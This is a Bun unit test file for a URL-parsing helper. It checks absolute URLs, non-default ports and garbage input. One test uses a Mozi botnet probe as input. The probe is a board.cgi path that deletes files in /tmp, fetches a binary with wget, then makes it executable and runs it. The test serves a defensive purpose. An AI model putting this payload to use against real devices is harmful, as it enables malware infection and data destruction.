import { describe, expect, it } from "bun:test";
import { parseRequestUrl } from "@better-ccflare/core";

describe("parseRequestUrl", () => {
	it("should parse a normal absolute request URL", () => {
		const url = parseRequestUrl("http://localhost:8080/v1/messages?beta=true");
		expect(url).not.toBeNull();
		expect(url?.pathname).toBe("/v1/messages");
		expect(url?.searchParams.get("beta")).toBe("true");
	});

	it("should parse an https URL with a non-default port", () => {
		const url = parseRequestUrl("https://example.com:8443/api/accounts");
		expect(url).not.toBeNull();
		expect(url?.pathname).toBe("/api/accounts");
	});

	it("should return null for a path-only URL from a Host-less scanner request", () => {
		// Bun exposes req.url as the bare path when the client omits the Host
		// header (e.g. Mozi botnet HTTP/1.0 probes), which new URL() rejects
		const url = parseRequestUrl(
			"/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron",
		);
		expect(url).toBeNull();
	});

	it("should return null for garbage input", () => {
		expect(parseRequestUrl("")).toBeNull();
		expect(parseRequestUrl("not a url at all")).toBeNull();
	});
});
